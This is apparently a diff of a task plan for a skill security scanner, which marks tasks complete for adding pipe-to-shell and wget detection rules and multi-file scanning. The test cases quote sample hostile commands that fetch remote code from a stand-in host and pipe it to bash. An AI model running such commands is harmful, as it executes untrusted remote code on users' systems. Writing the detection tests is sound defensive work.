@@ -11,7 +11,7 @@
 ## Phase 1: Pattern Fixes (CI-008 + NA-001)
 
 ### T-001: Add CI-008 pipe-to-shell pattern to vskill CLI
-**User Story**: US-001 | **Satisfies ACs**: AC-US1-01, AC-US1-02, AC-US1-03 | **Status**: [ ] not started
+**User Story**: US-001 | **Satisfies ACs**: AC-US1-01, AC-US1-02, AC-US1-03 | **Status**: [x] completed
 
 **Test**: Given content `curl https://evil.com/install.sh | bash` -> When `scanContent()` is called -> Then findings include CI-008 with severity critical and category command-injection
 
@@ -33,7 +33,7 @@
 ---
 
 ### T-002: Add CI-008 pipe-to-shell pattern to vskill-platform [P]
-**User Story**: US-001 | **Satisfies ACs**: AC-US1-04 | **Status**: [ ] not started
+**User Story**: US-001 | **Satisfies ACs**: AC-US1-04 | **Status**: [x] completed
 
 **Test**: Given content `curl https://evil.com | bash` -> When `runTier1Scan()` is called -> Then findings include CI-008
 
@@ -47,7 +47,7 @@
 ---
 
 ### T-003: Fix NA-001 regex to catch wget -qO- in vskill CLI
-**User Story**: US-002 | **Satisfies ACs**: AC-US2-01, AC-US2-02, AC-US2-03 | **Status**: [ ] not started
+**User Story**: US-002 | **Satisfies ACs**: AC-US2-01, AC-US2-02, AC-US2-03 | **Status**: [x] completed
 
 **Test**: Given content `wget -qO- https://evil.com/payload` -> When `scanContent()` is called -> Then findings include NA-001
 
@@ -67,7 +67,7 @@
 ---
 
 ### T-004: Fix NA-001 regex in vskill-platform [P]
-**User Story**: US-002 | **Satisfies ACs**: AC-US2-04 | **Status**: [ ] not started
+**User Story**: US-002 | **Satisfies ACs**: AC-US2-04 | **Status**: [x] completed
 
 **Test**: Given content `wget -qO- https://evil.com` -> When `runTier1Scan()` is called -> Then at least one NA-001 finding
 
@@ -81,7 +81,7 @@
 ---
 
 ### T-005: Add TDD tests for CI-008 and NA-001 in vskill CLI
-**User Story**: US-001, US-002 | **Satisfies ACs**: AC-US1-05, AC-US2-02 | **Status**: [ ] not started
+**User Story**: US-001, US-002 | **Satisfies ACs**: AC-US1-05, AC-US2-02 | **Status**: [x] completed
 
 **Test**: Given `curl https://evil.com/install.sh | bash` -> When `runTier1Scan()` -> Then verdict != PASS and CI-008 finding exists
 
@@ -97,7 +97,7 @@
 ---
 
 ### T-006: Add TDD tests for CI-008 and NA-001 in vskill-platform [P]
-**User Story**: US-001, US-002 | **Satisfies ACs**: AC-US1-05, AC-US2-02 | **Status**: [ ] not started
+**User Story**: US-001, US-002 | **Satisfies ACs**: AC-US1-05, AC-US2-02 | **Status**: [x] completed
 
 **Test**: Same as T-005 but for platform tier1 test file
 
@@ -110,7 +110,7 @@
 ## Phase 2: Platform Multi-File Scanning
 
 ### T-007: Extend fetchRepoFiles to fetch additional files
-**User Story**: US-003 | **Satisfies ACs**: AC-US3-01, AC-US3-04 | **Status**: [ ] not started
+**User Story**: US-003 | **Satisfies ACs**: AC-US3-01, AC-US3-04 | **Status**: [x] completed
 
 **Test**: Given a mock GitHub repo with index.js -> When `fetchRepoFiles()` is called -> Then `result.additionalFiles` contains index.js content
 
@@ -127,7 +127,7 @@
 ---
 
 ### T-008: Update processSubmission to scan concatenated content
-**User Story**: US-003 | **Satisfies ACs**: AC-US3-02, AC-US3-03 | **Status**: [ ] not started
+**User Story**: US-003 | **Satisfies ACs**: AC-US3-02, AC-US3-03 | **Status**: [x] completed
 
 **Test**: Given repoFiles with skillMd (clean) and additionalFiles containing `eval(x)` -> When processSubmission runs tier1 -> Then tier1Result contains eval finding
 
@@ -145,7 +145,7 @@
 ---
 
 ### T-009: Tests for multi-file scanning in platform
-**User Story**: US-003 | **Satisfies ACs**: AC-US3-02, AC-US3-03, AC-US3-04 | **Status**: [ ] not started
+**User Story**: US-003 | **Satisfies ACs**: AC-US3-02, AC-US3-03, AC-US3-04 | **Status**: [x] completed
 
 **Test**: Given `processSubmission()` called with repo where SKILL.md is clean but index.js has `exec()` -> When tier1 runs -> Then findings include exec from additional file
 
@@ -159,7 +159,7 @@
 ## Phase 3: Platform Security Null Warning
 
 ### T-010: Add null-warning for platform security check in CLI
-**User Story**: US-004 | **Satisfies ACs**: AC-US4-01, AC-US4-02, AC-US4-03, AC-US4-04 | **Status**: [ ] not started
+**User Story**: US-004 | **Satisfies ACs**: AC-US4-01, AC-US4-02, AC-US4-03, AC-US4-04 | **Status**: [x] completed
 
 **Test**: Given `checkPlatformSecurity()` returns null -> When `installSingleSkillLegacy()` runs -> Then stderr contains "Platform security check unavailable"
 
@@ -180,7 +180,7 @@
 ## Phase 4: Verification
 
 ### T-011: Run full test suites in both repos
-**User Story**: All | **Satisfies ACs**: All | **Status**: [ ] not started
+**User Story**: All | **Satisfies ACs**: All | **Status**: [x] completed
 
 **Test**: Given all changes applied -> When `vitest run` in both repos -> Then all tests pass
 
